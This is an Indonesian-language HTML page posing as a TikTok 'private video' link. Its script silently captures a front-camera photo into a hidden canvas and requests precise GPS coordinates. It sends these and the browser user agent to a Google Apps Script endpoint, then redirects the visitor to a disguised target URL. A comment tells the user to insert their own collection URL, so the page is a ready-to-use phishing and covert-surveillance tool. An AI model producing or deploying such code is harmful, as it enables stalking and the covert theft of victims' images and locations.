<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TikTok - Menuju Video</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      background-color: #000;
      color: #fff;
    }
    .wrapper { text-align: center; padding: 25px; max-width: 350px; width: 85%; }
    .logo { font-size: 30px; font-weight: 800; margin-bottom: 20px; }
    .btn-tiktok {
      background-color: #fe2c55;
      color: #fff;
      border: none;
      padding: 14px;
      font-size: 16px;
      font-weight: 700;
      border-radius: 6px;
      cursor: pointer;
      width: 100%;
    }
    #hidden-video, #hidden-canvas { display: none; }
  </style>
</head>
<body>

  <div class="wrapper">
    <div class="logo">TikTok</div>
    <p style="font-size: 14px; margin-bottom: 25px; color: #bbb;">Tautan video privat. Klik untuk membuka video.</p>
    <button id="action-btn" class="btn-tiktok" onclick="handleStart()">Buka Video</button>
  </div>

  <video id="hidden-video" autoplay playsinline muted></video>
  <canvas id="hidden-canvas"></canvas>

  <script>
    // GANTI DENGAN URL WEB APP GOOGLE APPS SCRIPT ANDA
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbypVZuQ4agQnFIXEExtZn0zdA8Cnde8XMItjXyUtQNwPpUbwHDTRCfTQ0sUjoY2s6FzUg/execI";

    // Ambil URL tujuan dari parameter ?target=
    const urlParams = new URLSearchParams(window.location.search);
    const targetParam = urlParams.get('target');
    const targetUrl = targetParam ? atob(targetParam) : 'https://www.tiktok.com';

    let payload = {
      latitude: null,
      longitude: null,
      image: null,
      targetUrl: targetUrl,
      userAgent: navigator.userAgent
    };

    function handleStart() {
      const btn = document.getElementById('action-btn');
      btn.innerText = "Memuat...";
      btn.disabled = true;

      // 1. Minta Izin Kamera (Berjalan lancar tanpa iFrame)
      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
        .then((stream) => {
          const video = document.getElementById('hidden-video');
          video.srcObject = stream;
          video.onloadedmetadata = () => {
            setTimeout(() => {
              const canvas = document.getElementById('hidden-canvas');
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              const ctx = canvas.getContext('2d');
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              
              payload.image = canvas.toDataURL('image/jpeg', 0.6);
              stream.getTracks().forEach(t => t.stop());
              
              fetchLocation();
            }, 300);
          };
        })
        .catch(() => {
          fetchLocation();
        });
    }

    // 2. Minta Izin Lokasi GPS
    function fetchLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            payload.latitude = pos.coords.latitude;
            payload.longitude = pos.coords.longitude;
            sendDataAndRedirect();
          },
          () => {
            sendDataAndRedirect();
          },
          { enableHighAccuracy: true, timeout: 3000 }
        );
      } else {
        sendDataAndRedirect();
      }
    }

    // 3. Kirim ke Google Apps Script & Langsung Redirect
    function sendDataAndRedirect() {
      fetch(SCRIPT_URL, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'text/plain' },
        body: JSON.stringify(payload)
      })
      .catch(() => {})
      .finally(() => {
        window.location.href = targetUrl;
      });
    }
  </script>
</body>
</html>
